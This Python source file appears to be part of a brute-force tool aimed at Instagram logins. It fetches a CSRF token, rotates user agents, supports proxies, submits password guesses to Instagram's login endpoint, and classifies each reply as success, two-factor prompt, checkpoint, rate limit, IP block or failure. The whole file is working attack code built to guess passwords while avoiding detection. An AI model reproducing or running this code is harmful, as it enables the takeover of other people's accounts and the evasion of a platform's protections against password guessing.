#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Instagram web session + CSRF handling for classic brute engine."""

import random
import re
import time

import requests

from core.banner import info, ok, warn, error

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]


class IGSession:
    LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
    HOME_URL = "https://www.instagram.com/accounts/login/"

    def __init__(self, proxy=None):
        self.proxy = proxy
        self.session = requests.Session()
        self.csrf = ""
        self.ua = random.choice(USER_AGENTS)
        self.session.headers.update(
            {
                "User-Agent": self.ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Origin": "https://www.instagram.com",
                "Referer": "https://www.instagram.com/accounts/login/",
                "X-Requested-With": "XMLHttpRequest",
                "Connection": "keep-alive",
            }
        )
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}

    def initialize(self):
        info("Initializing session...")
        try:
            r = self.session.get(self.HOME_URL, timeout=25)
            self.csrf = (
                r.cookies.get("csrftoken")
                or self.session.cookies.get("csrftoken")
                or ""
            )
            if not self.csrf:
                m = re.search(r'"csrf_token"\s*:\s*"([^"]+)"', r.text)
                if m:
                    self.csrf = m.group(1)
            if not self.csrf:
                error("Failed to obtain CSRF token — network/block?")
                return False
            self.session.headers.update(
                {
                    "X-CSRFToken": self.csrf,
                    "X-Instagram-AJAX": "1",
                    "X-IG-App-ID": "936619743392459",
                    "Content-Type": "application/x-www-form-urlencoded",
                }
            )
            ok("Session initialized, CSRF: %s..." % self.csrf[:12])
            return True
        except requests.RequestException as exc:
            error("Session init error: %s" % exc)
            return False

    def refresh(self):
        warn("Refreshing session / CSRF ...")
        self.session.cookies.clear()
        self.ua = random.choice(USER_AGENTS)
        self.session.headers["User-Agent"] = self.ua
        time.sleep(random.uniform(2, 4))
        return self.initialize()

    def try_login(self, username, password):
        payload = {
            "username": username,
            "enc_password": "#PWD_INSTAGRAM_BROWSER:0:%d:%s" % (int(time.time()), password),
            "queryParams": "{}",
            "optIntoOneTap": "false",
            "trustedDeviceRecords": "{}",
        }
        try:
            r = self.session.post(self.LOGIN_URL, data=payload, timeout=25)
        except requests.RequestException as exc:
            return {"status": "error", "raw": str(exc), "password": password}

        new_csrf = r.cookies.get("csrftoken")
        if new_csrf:
            self.csrf = new_csrf
            self.session.headers["X-CSRFToken"] = new_csrf

        text = r.text or ""
        code = r.status_code
        if code == 429:
            return {"status": "rate_limit", "raw": text[:300], "password": password}

        try:
            data = r.json()
        except ValueError:
            return {"status": "error", "raw": text[:300], "password": password}

        if data.get("authenticated") is True:
            return {"status": "ok", "raw": data, "password": password}
        if data.get("two_factor_required"):
            return {"status": "two_factor", "raw": data, "password": password}
        if data.get("checkpoint_url") or data.get("checkpoint_required"):
            return {"status": "checkpoint", "raw": data, "password": password}

        msg = str(data.get("message", "")).lower()
        if "checkpoint" in msg:
            return {"status": "checkpoint", "raw": data, "password": password}
        if "rate" in msg or "wait" in msg:
            return {"status": "rate_limit", "raw": data, "password": password}
        if data.get("user") is False or data.get("authenticated") is False:
            return {"status": "fail", "raw": data, "password": password}
        if data.get("spam") or data.get("error_type") == "ip_block":
            return {"status": "blocked", "raw": data, "password": password}
        return {"status": "fail", "raw": data, "password": password}
